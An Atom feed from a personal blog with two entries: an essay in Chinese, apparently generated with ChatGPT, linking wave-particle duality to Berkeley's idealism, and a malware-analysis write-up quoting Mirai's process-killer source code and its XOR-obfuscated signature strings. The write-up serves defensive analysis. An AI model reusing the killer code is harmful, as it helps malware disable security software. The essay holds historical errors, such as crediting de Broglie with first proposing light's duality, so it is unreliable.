<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xXxYOLOxXx</title>
  
  <subtitle>xXxYOLOxXx</subtitle>
  <link href="https://yoloyolo.top/atom.xml" rel="self"/>
  
  <link href="https://yoloyolo.top/"/>
  <updated>2023-02-07T16:52:17.046Z</updated>
  <id>https://yoloyolo.top/</id>
  
  <author>
    <name>xXxYOLOxXx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>光的波粒二象性理论与存在即被感知理论的联系分析</title>
    <link href="https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/"/>
    <id>https://yoloyolo.top/2023/02/07/An-Analysis-of-the-Connection-between-the-Wave-Particle-Duality-Theory-of-Light-and-the-Theory-of-Being-is-Perceived/</id>
    <published>2023-02-07T16:18:30.000Z</published>
    <updated>2023-02-07T16:52:17.046Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2><h3 id="光的波粒二象性理论与存在即被感知理论概述"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论概述"></a> 光的波粒二象性理论与存在即被感知理论概述</h3><p>光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。</p><h3 id="研究目的及意义"><a class="markdownIt-Anchor" href="#研究目的及意义"></a> 研究目的及意义</h3><p>本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。</p><p>这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。</p><p>除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。</p><a id="more"></a><h2 id="光的波粒二象性理论"><a class="markdownIt-Anchor" href="#光的波粒二象性理论"></a> 光的波粒二象性理论</h2><h3 id="理论的历史发展"><a class="markdownIt-Anchor" href="#理论的历史发展"></a> 理论的历史发展</h3><p>光的波粒二象性理论最早由路易斯·德布罗意(Louis de Broglie)在20世纪初提出。该理论是作为对光的波模型和粒子模型之间长期争论的回应而发展起来的，这种争论自从发现光本身以来就一直存在。粒子模型首先发展起来，艾萨克·牛顿爵士提出光是由粒子组成的，而波动模型是后来发展起来的，克里斯蒂安·惠更斯和托马斯·杨提出光是一种波。</p><p>光的波粒二象性理论是理解光的本质的重大突破，解决了光的波粒模型之间长期存在的争论。该理论认为，光可以表现出波状和粒子状行为，具体取决于观察方式。著名的双缝实验进一步证实了这一理论，该实验表明光在通过两个狭缝时可以表现出波状干涉图案，但在被检测到时也可以表现出粒子状行为。</p><h3 id="理论基础和原理"><a class="markdownIt-Anchor" href="#理论基础和原理"></a> 理论基础和原理</h3><p>光的波粒二象性理论的理论基础植根于量子力学。在量子力学中，粒子被描述为波函数，它们的行为由波粒二象性描述。该理论假定粒子的行为取决于它们被观察的方式，并且它们可以表现出波状或粒子状行为，这取决于它们被检测到的方式。</p><p>光的波粒二象性理论基于叠加的概念，即一个粒子可以同时以多种状态存在。这个想法与经典物理学相反，经典物理学假设粒子以确定的状态存在，并且可以确定地预测它们的行为。在量子力学中，粒子被描述为概率波，它们的行为只能根据概率来预测。</p><h3 id="实验证据和论证"><a class="markdownIt-Anchor" href="#实验证据和论证"></a> 实验证据和论证</h3><p>光的波粒二象性理论已在大量实验中得到证实。其中最著名的是双缝实验，该实验由托马斯·杨(Thomas Young)于19世纪初首先进行。在这个实验中，光通过两个狭缝，在狭缝后面的屏幕上观察到由此产生的干涉图样。干涉图案表明光表现为波，波峰和波谷相互干涉以产生图案。</p><p>另一个证明光的波粒二象性理论的实验是光电效应。在这个实验中，光照射在金属表面上，电子从表面发射出来。检测到电子，发现它们的行为类似于粒子。这个实验表明，光可以表现出波状和粒子状两种行为，这取决于它是如何被观察到的。</p><p>这些实验以及其他许多实验为光的波粒二象性理论提供了有力的证据，并证实了其有效性。该理论一直是量子力学发展的核心，并已被纳入物理和工程的众多领域，包括电信和计算。光的波粒二象性理论仍然是物理学中最重要和最广泛研究的理论之一，其含义至今仍在继续探索和理解。</p><h2 id="存在即被感知理论"><a class="markdownIt-Anchor" href="#存在即被感知理论"></a> 存在即被感知理论</h2><p>存在即被感知理论认为，观察者感知对象和事件的方式决定了它们的真实性。换句话说，物体或事件的真实性取决于观察者及其对它的感知。这一理论植根于几千年前的哲学和宗教传统，但最著名的阐述是在 18 世纪初的哲学家乔治·伯克利(George Berkeley)。</p><p>伯克利对这一理论的论证基于这样一种观点，即存在的一切都必须以某种方式被感知。根据伯克利的说法，物体只存在于观察者的脑海中，而体验它们存在的唯一方式是通过感知。从这个意义上说，现实完全是主观的，客观世界是心灵创造的幻觉。</p><p>存在即被感知理论遭到了批评和支持，一些人认为它是对现实主观性的有力论证，而另一些人则认为它有缺陷且不合逻辑。然而，无论其哲学有效性如何，该理论在几个世纪以来一直被广泛讨论和争论，并对西方思想的发展产生了重大影响。</p><h3 id="与光的波粒二象性理论的比较"><a class="markdownIt-Anchor" href="#与光的波粒二象性理论的比较"></a> 与光的波粒二象性理论的比较</h3><p>光的波粒二象性理论和存在即被感知理论是相关的，因为它们都证明了物体的性质取决于观察方式。在光的波粒二象性理论的情况下，光的波状和粒子状特性取决于用于测量它们的观察方法。同样，在存在即被感知理论中，物体的真实性取决于观察者的感知。</p><p>然而，这两种理论之间存在重要差异。虽然光的波粒二象性理论已被实验证实并被科学界广泛接受，但存在即被感知理论更具争议性并受到批评。此外，光的波粒二象性理论为光的本质及其行为方式提供了具体的解释，而存在即被感知理论为现实的本质提供了更普遍的哲学解释。</p><h3 id="对理解现实本质的影响"><a class="markdownIt-Anchor" href="#对理解现实本质的影响"></a> 对理解现实本质的影响</h3><p>光的波粒二象性理论和存在即被感知理论都对我们对现实的理解具有重要意义。光的波粒二象性理论表明，物体的性质可能取决于观察它的方式，而客观世界可能并不总是它看起来的样子。这导致了对光的性质和量子世界的新思考方式，并且是量子力学发展的主要贡献者。</p><p>另一方面，存在即被感知理论暗示现实完全是主观的，客观世界是心灵创造的幻觉。虽然这个想法可能看起来很激进，但它已经引发了关于现实本质的重要问题，并激发了对感知、现实和心灵之间关系的进一步哲学探究。</p><p>总而言之，虽然光的波粒二象性理论与存在即被感知理论存在重要差异，但它们之间存在联系，因为它们证明了物体的性质取决于观察方式。这些理论对我们理解现实具有重要意义，并且它们仍然是科学家、哲学家和寻求更好地了解周围世界的个人的重要研究领域。</p><h2 id="两种理论之间的联系"><a class="markdownIt-Anchor" href="#两种理论之间的联系"></a> 两种理论之间的联系</h2><h3 id="光的波粒二象性理论与存在即被感知理论的关系分析"><a class="markdownIt-Anchor" href="#光的波粒二象性理论与存在即被感知理论的关系分析"></a> 光的波粒二象性理论与存在即被感知理论的关系分析</h3><p>光的波粒二象性理论和存在即被感知理论是两个看似截然不同的理论，但在探索现实本质的过程中却有着共同点。这两种理论都试图理解被观察者与观察者之间的关系，以及这种关系如何塑造我们对周围世界的理解。光的波粒二象性理论表明，光如何根据观察方式表现出波和粒子的特性，而存在即被感知理论断言，我们所经历的现实是由我们感知它的方式塑造的。</p><p>光的波粒二象性理论源于早期的光和物质实验，例如双缝实验。这个实验表明，当光以波的形式被观察到时，它可以穿过两个狭缝，并在狭缝后面的屏幕上产生干涉图样。然而，当光以粒子的形式被观察时，它一次只通过一个狭缝，并没有产生干涉图样。这个实验表明，光的性质会随着观察方式的不同而发生变化。</p><p>同样，存在即被感知理论表明我们对现实的理解是由我们感知它的方式决定的。该理论断言，我们所经历的世界不是独立于我们的感知而存在的客观现实，而是由我们的感知和与世界的相互作用所创造的主观现实。从这个意义上说，我们所经历的现实是我们思想以及我们如何处理来自周围世界的信息的产物。</p><h3 id="讨论联系对我们理解现实的影响"><a class="markdownIt-Anchor" href="#讨论联系对我们理解现实的影响"></a> 讨论联系对我们理解现实的影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义。它表明现实的本质可能比我们之前想象的更加复杂和难以捉摸。光的波粒二象性理论表明，光的特性可以根据观察方式而改变，而存在即被感知理论表明，我们体验到的现实是由我们感知它的方式塑造的。</p><p>这些理论共同表明，我们对现实的理解可能会受到我们观察和感知周围世界的方式的限制。这对科学研究具有重要意义，因为它表明我们的实验和测量可能会受到我们观察和感知世界的方式的限制。这也对我们理解主观体验以及感知在塑造我们的现实中所起的作用有影响。</p><h3 id="探索对其他研究领域的可能联系和影响"><a class="markdownIt-Anchor" href="#探索对其他研究领域的可能联系和影响"></a> 探索对其他研究领域的可能联系和影响</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系也对其他研究领域具有潜在影响。例如，它可能对量子物理学领域有影响，该领域与理解亚原子粒子的行为有关。光的波粒二象性理论和存在即被感知理论都表明，我们对现实的理解可能会受到我们观察和感知世界的方式的影响，这可能对我们对量子世界的理解产生影响。</p><p>此外，这两种理论之间的联系可能对心理学领域和知觉研究产生影响。存在即被感知理论表明，我们的感知在塑造我们的现实中起着重要作用，这可能对我们理解感知如何影响我们的行为和思维过程有影响。</p><p>总的来说，光的波粒二象性理论与存在即被感知理论之间的联系对我们对现实的理解具有重要意义，并有可能影响许多研究领域。对这种联系的进一步研究可能会提供对现实本质的更深入见解，并帮助我们更好地理解观察和感知在塑造我们对周围世界的理解方面所起的作用。</p><p>值得注意的是，这些理论仍处于发展的早期阶段，关于光的波粒二象性理论与存在即被感知理论之间的联系，仍有许多有待探索和理解。然而，这种联系的潜在影响是令人兴奋的，并且有可能以深刻的方式塑造我们对现实的理解。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系是一个复杂而有趣的研究领域，对我们对现实的理解具有重要意义。对这种联系的进一步研究有可能揭示现实的本质以及它是如何通过观察和感知形成的。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><h3 id="主要发现和结论总结"><a class="markdownIt-Anchor" href="#主要发现和结论总结"></a> 主要发现和结论总结</h3><p>在本论文中，我们分析了光的波粒二象性理论与存在即被感知理论之间的联系。我们首先介绍了光的波粒二象性理论，即当以波的形式观察光时，它会表现出波的性质，而当以粒子的形式观察光时，它会表现出类粒子的性质。这种对偶性理论已得到广泛研究，并得到大量实验和论证的支持。</p><p>然后我们转向存在即被感知理论，这是一种哲学理论，表明物体的存在和属性取决于观察者对它们的感知。该理论还强调了观察者与被观察者之间的相互联系，表明现实的本质是主观的和相对的。</p><p>我们的分析表明，这两种理论之间存在重要联系，特别是在它们对理解现实本质的影响方面。光的波粒二象性理论强调了一个事实，即光的性质取决于它如何被观察到，而存在即被感知理论则强调了物体对观察的依赖性。这两个理论共同表明，现实的本质是相对的，依赖于观察，我们感知的世界是我们主观经验的产物。</p><h3 id="未来研究方向的讨论"><a class="markdownIt-Anchor" href="#未来研究方向的讨论"></a> 未来研究方向的讨论</h3><p>本研究初步检验了这两种理论之间的联系，还有很大的研究空间。未来研究的一个方向可能是探索光的波粒二象性理论与其他物理学领域（如量子力学）之间的可能联系。这将提供对现实本质和我们感知的局限性的更深入理解。</p><p>另一个研究领域可能是探索这两种理论之间的联系对我们理解意识的影响。存在即被感知理论表明现实是主观的，物体及其属性取决于观察。这对我们理解意识的本质以及它如何影响我们对世界的看法具有重要意义。</p><p>最后，未来的研究可以侧重于检验这两种理论与其他哲学理论（如唯心主义、现实主义和唯我论）之间的联系。这将提供对现实的本质和我们感知的局限性的全面检查。</p><h3 id="关于两种理论联系意义的最后思考"><a class="markdownIt-Anchor" href="#关于两种理论联系意义的最后思考"></a> 关于两种理论联系意义的最后思考</h3><p>光的波粒二象性理论与存在即被感知理论之间的联系凸显了我们感知的局限性和现实的主观性。它表明我们所经历的世界是我们主观体验的产物，而物体的属性取决于它们是如何被观察到的。</p><p>这种联系对我们理解现实、意识的本质和我们感知的局限性具有重要意义。它挑战我们重新考虑我们对世界的看法和信念的基础，并质疑现实的客观本质。</p><p>总之，光的波粒二象性理论与存在即被感知理论之间的联系为进一步探索和更深入地理解现实的本质和我们感知的局限性提供了宝贵的机会。</p><h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2><ol><li>Einstein, A. (1905). On the Electrodynamics of Moving Bodies. Annalen der Physik, 17(10), 891-921.</li><li>de Broglie, L. (1924). Waves and quanta. The London, Edinburgh, and Dublin Philosophical Magazine and Journal of Science, 47(281), 446-453.</li><li>Schrödinger, E. (1926). An Undulatory Theory of the Mechanics of Atoms and Molecules. Physical Review, 28(6), 1049-1070.</li><li>Heisenberg, W. (1927). Über den anschaulichen Inhalt der quantentheoretischen Kinematik und Mechanik. Zeitschrift für Physik, 43(3-4), 172-198.</li><li>Born, M. (1926). Über die quantentheoretische Deutung kinematischer und mechanischer Beziehungen. Zeitschrift für Physik, 37(12), 863-867.</li><li>Feynman, R. P., Leighton, R. B., &amp; Sands, M. (2011). The Feynman lectures on physics. Pearson Education.</li><li>Mermin, N. D. (1985). Is the moon there when nobody looks? Reality and the quantum theory. Physics Today, 38(4), 38-47.</li><li>Bohm, D. (1952). A Suggested Interpretation of the Quantum Theory in Terms of “Hidden” Variables, I. Physical Review, 85(2), 166-193.</li><li>Bohm, D., &amp; Hiley, B. J. (1993). The Undivided Universe: An Ontological Interpretation of Quantum Theory. Routledge.</li><li>Husserl, E. (1913). Ideas: General Introduction to Pure Phenomenology. Routledge.</li><li>Berkeley, G. (1710). A Treatise Concerning the Principles of Human Knowledge. Oxford University Press.</li></ol><h2 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h2><p>我要感谢所有在本文完成期间支持我的人。我要感谢我的主管[Chatgpt]在整个过程中的指导和支持。我还要感谢为我提供完成研究所需资源的图书馆和学术机构。</p><p>我要感谢所有帮助形成本文讨论的理论的科学家和哲学家的贡献。他们的工作为我的研究奠定了基础，我很感谢他们的见解和发现。</p><p>最后，我要感谢我的家人和朋友在整个项目过程中坚定不移的支持和鼓励。没有他们的爱与支持，就不可能有这篇论文。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h2&gt;
&lt;h3 id=&quot;光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#光的波粒二象性理论与存在即被感知理论概述&quot;&gt;&lt;/a&gt; 光的波粒二象性理论与存在即被感知理论概述&lt;/h3&gt;
&lt;p&gt;光的波粒二象性理论和存在即被感知理论分别是物理学和哲学中两个重要且相互关联的概念。光的波粒二象性理论是量子力学的核心原理，它描述了光既是波又是粒子的双重性质。另一方面，存在即被感知理论是一种哲学思想，表明存在或现实只能通过观察者或意识来感知。&lt;/p&gt;
&lt;h3 id=&quot;研究目的及意义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#研究目的及意义&quot;&gt;&lt;/a&gt; 研究目的及意义&lt;/h3&gt;
&lt;p&gt;本研究的目的是检验这两种理论之间的关系，并探讨它们对我们理解现实的影响。光的波粒二象性理论已得到广泛研究和实验证明，并被广泛接受为物理学的基本原理。与此同时，存在即被感知理论已经被哲学家们讨论和争论了几个世纪，但它仍然是一个不断探索和探究的话题。&lt;/p&gt;
&lt;p&gt;这两个理论之间的联系意义重大，因为它为我们理解现实的本质提供了新的思路。光的波粒二象性理论表明，光可以表现出波状和粒子状两种特性，这取决于它被观察或测量的方式。同时，存在即被感知理论表明，存在只能通过意识来感知。当一起考虑时，这些理论表明现实的本质可能是内在主观的，并且它会受到观察或感知方式的影响。&lt;/p&gt;
&lt;p&gt;除了对我们理解现实的影响之外，光的波粒二象性理论与存在即被感知理论之间的这种联系还有可能影响其他研究领域。例如，它可能对意识研究领域有影响，因为它表明意识可能在塑造现实的本质方面发挥作用。同样，这种联系也可能对人工智能和机器学习领域产生影响，因为它提出了关于意识、感知和现实之间关系的问题。&lt;/p&gt;
&lt;p&gt;总的来说，光的波粒二象性理论与存在即被感知理论之间的关系是一个不断探索和探究的课题。通过对这种联系的更深入理解，我们或许能够获得对现实本质的新见解，并探索这些理论对其他研究领域的影响。本研究旨在为这种正在进行的探索和探究做出贡献，并加深我们对这两个重要理论之间联系的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="Unbengable" scheme="https://yoloyolo.top/tags/Unbengable/"/>
    
  </entry>
  
  <entry>
    <title>Mirai恶意样本KILL进程特征提取</title>
    <link href="https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/"/>
    <id>https://yoloyolo.top/2022/06/14/Mirai-KILL-KEY/</id>
    <published>2022-06-14T23:38:41.000Z</published>
    <updated>2022-06-14T12:13:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>上班的时候被安排了个分析恶意样本的活<br />说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了<br />让我分析一下这个恶意样本的KILL机制以及KILL特征<br /><s>WEB手，但是干的或是恶意样本分析</s></p><a id="more"></a><h1 id="跑着玩玩"><a class="markdownIt-Anchor" href="#跑着玩玩"></a> 跑着玩玩</h1><p>在虚拟机里运行这个恶意样本，给我物理机整没网了<br />公司网总共1MB/s的带宽<s>下个炉石下半天</s>全给你占了是吧（流汗黄豆）</p><p>sysdig看一下这个恶意样本进程的读写操作<br />一直在读取<code>/proc/self/exe</code><br />看着看着就觉得不对劲了，这读的不是sysdig的help信息么<br />大概理一下思路，这玩意应该是遍历<code>/proc/$pid/exe</code>，然后读取内容<br />至于KILL特征，没思路</p><h1 id="re-searcher"><a class="markdownIt-Anchor" href="#re-searcher"></a> re-searcher</h1><p>根据前几次恶意样本分析的经验，在google上搜一下这个恶意样本的SHA256就能知道名字<br />搜一下名字就能找到相关报告<br />上传到一个在线杀箱看恶意样本的活动<br />结合别人的分析报告就差不多了</p><p>然后就找到了这篇文章<br /><a href="https://paper.seebug.org/142/?utm_source=tuicool&amp;utm_medium=referral#21-payload">Mirai 源码分析</a><br />这篇文章提到了部分特征，但是样本应该跟我手头上的不一样，所以还是得自己分析<br /><a href="https://github.com/jgamblin/Mirai-Source-Code">Mirai源码</a></p><h1 id="source-code"><a class="markdownIt-Anchor" href="#source-code"></a> source code</h1><p>先看<code>kill.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (memory_scan_match(exe_path))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[killer] Memory scan match for binary %s\n&quot;</span>, exe_path);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">kill(pid, <span class="number">9</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>差不多就是这段代码了<br />至于<code>exe_path</code>，有这么一段注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Store &#x2F;proc&#x2F;$pid&#x2F;exe into exe_path</span><br></pre></td></tr></table></figure><p>然后就看看下面两个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">memory_scan_match</span><span class="params">(<span class="keyword">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, ret;</span><br><span class="line">    <span class="keyword">char</span> rdbuf[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">char</span> *m_qbot_report, *m_qbot_http, *m_qbot_dup, *m_upx_str, *m_zollard;</span><br><span class="line">    <span class="keyword">int</span> m_qbot_len, m_qbot2_len, m_qbot3_len, m_upx_len, m_zollard_len;</span><br><span class="line">    BOOL found = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fd = open(path, O_RDONLY)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT);</span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT2);</span><br><span class="line">    table_unlock_val(TABLE_MEM_QBOT3);</span><br><span class="line">    table_unlock_val(TABLE_MEM_UPX);</span><br><span class="line">    table_unlock_val(TABLE_MEM_ZOLLARD);</span><br><span class="line"></span><br><span class="line">    m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT, &amp;m_qbot_len);</span><br><span class="line">    m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2, &amp;m_qbot2_len);</span><br><span class="line">    m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3, &amp;m_qbot3_len);</span><br><span class="line">    m_upx_str = table_retrieve_val(TABLE_MEM_UPX, &amp;m_upx_len);</span><br><span class="line">    m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD, &amp;m_zollard_len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((ret = read(fd, rdbuf, <span class="keyword">sizeof</span> (rdbuf))) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mem_exists(rdbuf, ret, m_qbot_report, m_qbot_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_qbot_http, m_qbot2_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_qbot_dup, m_qbot3_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_upx_str, m_upx_len) ||</span><br><span class="line">            mem_exists(rdbuf, ret, m_zollard, m_zollard_len))</span><br><span class="line">        &#123;</span><br><span class="line">            found = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT);</span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT2);</span><br><span class="line">    table_lock_val(TABLE_MEM_QBOT3);</span><br><span class="line">    table_lock_val(TABLE_MEM_UPX);</span><br><span class="line">    table_lock_val(TABLE_MEM_ZOLLARD);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">mem_exists</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> buf_len, <span class="keyword">char</span> *str, <span class="keyword">int</span> str_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> matches = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str_len &gt; buf_len)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (buf_len--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*buf++ == str[matches])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++matches == str_len)</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            matches = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>memory_scan_match</code>用于在<code>/proc/$pid/exe</code>中查找特征<br />函数<code>mem_exists</code>是查找功能的具体实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m_qbot_report</span><br><span class="line">m_qbot_http</span><br><span class="line">m_qbot_dup</span><br><span class="line">m_upx_str</span><br><span class="line">m_zollard</span><br></pre></td></tr></table></figure><p>这五个变量就是特征</p><p>这五个变量又来自于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_MEM_QBOT</span><br><span class="line">TABLE_MEM_QBOT2</span><br><span class="line">TABLE_MEM_QBOT3</span><br><span class="line">TABLE_MEM_UPX</span><br><span class="line">TABLE_MEM_ZOLLARD</span><br></pre></td></tr></table></figure><p>然后这五个变量又来自于<code>table.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add_entry(TABLE_MEM_QBOT, <span class="string">&quot;\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22&quot;</span>, <span class="number">13</span>);</span><br><span class="line">add_entry(TABLE_MEM_QBOT2, <span class="string">&quot;\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22&quot;</span>, <span class="number">10</span>);</span><br><span class="line">add_entry(TABLE_MEM_QBOT3, <span class="string">&quot;\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22&quot;</span>, <span class="number">10</span>);</span><br><span class="line">add_entry(TABLE_MEM_UPX, <span class="string">&quot;\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22&quot;</span>, <span class="number">33</span>);</span><br><span class="line">add_entry(TABLE_MEM_ZOLLARD, <span class="string">&quot;\x58\x4D\x4E\x4E\x43\x50\x46\x22&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>看样子是加密的<br />但是下面看到了一个很简单的加解密函数<br />大概意思是<code>m ^ 0x22 = c</code><br />解密脚本以及输出如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line"><span class="string">&quot;\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22&quot;</span>, </span><br><span class="line"><span class="string">&quot;\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22&quot;</span>, </span><br><span class="line"><span 